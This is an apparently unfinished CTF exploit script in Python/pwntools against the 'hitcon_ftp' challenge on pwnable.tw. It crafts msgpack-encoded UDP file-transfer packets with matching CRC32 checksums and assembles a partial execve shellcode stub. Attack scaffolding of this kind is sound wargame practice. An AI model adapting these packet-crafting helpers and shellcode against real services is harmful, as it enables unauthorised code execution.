#!/usr/bin/env python3

from pwn import *
import msgpack
import socket
import zlib
import struct

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
ru = lambda data, proc=None: proc.recvuntil(data) if proc else p.recvuntil(data)
r = lambda data, proc=None: proc.recv(data) if proc else p.recv(data)


context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('hitcon_ftp_patched', checksec=False)
libc = ELF('./libs/libc.so.6', checksec=False)
context.binary = exe

p = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
p.bind(("0", 3636))

p2 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
p2.bind(("0", 6767))

if args.REMOTE:
    s  = remote("chall.pwnable.tw", 10309)
    s.recvuntil(b'on udp port: ')
    port = int(s.recvline())


def s_pack(pack, p = p, condition = 1):
    if condition == 1:
        data = msgpack.packb(pack,use_bin_type= True )
    else:
        data = msgpack.packb(pack,use_bin_type= False )
         
    print(f'packet: {pack}')
    info(f'packet size: {size(data)}')
    print("[>] source:", p.getsockname())

    if args.REMOTE:
        p.sendto(data, ("chall.pwnable.tw", port))
    else:
        p.sendto(data, ("0", 69))


def r_pack(p):
    data, addr = p.recvfrom(0x10000)
    print("[<] from:", addr)
    print(f'Raw packet data received: {data}')
    try:
        print("[<] msgpack received:", msgpack.unpackb(data, raw=True, strict_map_key=False))
    except Exception as e:
        print("[!] msgpack unpack failed:", e)

    return data


def msgpack_print_str_like(buf) :
   
    out = bytearray()
    for c in (buf):
        # c is int: 0~255
        if c == 0x22:
            out+= b'\\"'
        # C isprint-like ASCII printable range
        elif 0x20 <= c <= 0x7e:
            out.append(c)
        else:
            out += f"\\x{c:02x}".encode()
    return bytes(out)

def calc_err(data, minus):
    # same as initial num = 0xffffffff and final ~num
    
    res = msgpack_print_str_like(data)
    
    # only works if last byte is printable character
    # sometimes still not work too
    """
    AI suchhhhhhhhhh!!! :((((
    If last byte is some raw byte, then need to len-1
    It happened like that because the oringinal command
    in C used snprintf to transfer bytes and used that return 
    nbytes to minus or add with the current len then 
    compare it with given one
    Quite confusing, just reverse in that step to understand mroe 
    """
    crc_input = res[:len(data) - minus]
    print(f'len: {len(crc_input)}')
    print(f'After convert: {crc_input}')
    return zlib.crc32(crc_input) & 0xffffffff



def path_1(name, p = p, load = None, load2 = None):
    pack = [
        1, name, "netascii"
    ]
    if load is not None:
        pack.append(load)
    if load2 is not None:
        pack.append(load2)

    s_pack(pack, p)
    res = r_pack(p)
    global cnt
    cnt = 1

    return res


def path_2(name, p = p, load = None, load2 = None):
    pack = [
        2, name, "netascii"
    ]
    if load is not None:
        pack.append(load)
    if load2 is not None:
        pack.append(load2)

    s_pack(pack, p)
    res = r_pack(p)
    return 0, res

def path(pack, p = p):
    s_pack(pack, p)
    res = r_pack(p)
    return 0, res

cnt = 1

def write_file(load, p = p, cnt = cnt, a = 1, minus=0):
    
    pack = [
        3, cnt, calc_err(load, minus), load
    ]

    s_pack(pack, p)
    if a:
        r_pack(p)
    
    return cnt + 1

def read_file(p = p, cnt = cnt):
    info(f'read file attempt: {cnt}')
    pack1 = [
    4, cnt-1, 
    ]


    s_pack(pack1, p)
    res = r_pack(p)

    return cnt + 1, res

def set_err(state, str, p = p):
    info(f'setting error:')
    pack = [
    5, state, str
    ]
    s_pack(pack, p)

shellcode = asm("""
    mov rax, 0x3b
    pop rdi
    pop rsi
    nop
    nop
    nop
    nop
    nop
    nop
                
""")

r_pack(p2)